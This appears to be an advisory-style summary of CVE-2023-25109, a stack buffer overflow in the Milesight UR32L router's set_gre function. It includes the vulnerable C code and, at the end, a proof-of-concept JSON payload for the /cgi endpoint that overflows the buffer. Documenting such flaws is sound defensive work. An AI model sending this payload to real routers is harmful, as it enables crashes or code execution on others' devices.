The provided content contains detailed information about CVE-2023-25109, among other CVEs, affecting Milesight UR32L routers.

**CVE-2023-25109**

*   **Root cause of vulnerability**: The `set_gre` function within the `vtysh_ubus` binary uses `sprintf` with the user-controlled `local_ip` parameter, leading to a buffer overflow.
*   **Weaknesses/vulnerabilities present**: Stack-based buffer overflow due to the usage of `sprintf` without proper bounds checking when handling the `local_ip` parameter.
*   **Impact of exploitation**: Arbitrary code execution.
*   **Attack vectors**: Sending a specially crafted HTTP POST request to the `/cgi` endpoint with a large `local_ip` value. The request must have a specific structure, targeting the `yruo_vpn_gre` core and the `set` function, with the malicious data included in the "values" array.
*   **Required attacker capabilities/position**: The attacker needs high privileges to send the malicious HTTP request.

**Technical Details**
The vulnerable code snippet is located within the `set_gre` function:

```c
is_equal = strcmp(table_key,"local_ip");
if (is_equal == 0) {
        vtysh_command_argument = (char *)blobmsg_get_string(table_value);
        vtysh_command_format = "tunnel source %s";
        [...]
}
sprintf(vtysh_command_buffer,vtysh_command_format,vtysh_command_argument);
```

The `local_ip` value is extracted from the JSON payload, and this user-controlled value is passed directly to `sprintf` without any length validation. This results in a buffer overflow when the size of `local_ip` exceeds the size of `vtysh_command_buffer`.

**Exploit Proof of Concept**
The following JSON payload will trigger the vulnerability:

```json
{
	"id": 9,
	"execute": 1,
	"core": "yruo_vpn_gre",
	"function": "set",
	"values": [
		{
			"base": "yruo_vpn_gre",
			"index": 1,
			"value": {
				"local_ip": "A"*0x300,
			}
		}
	]
}
```
This JSON payload will send a request to the `/cgi` endpoint, which eventually leads to the vulnerable `sprintf` call, causing a crash or potentially, arbitrary code execution.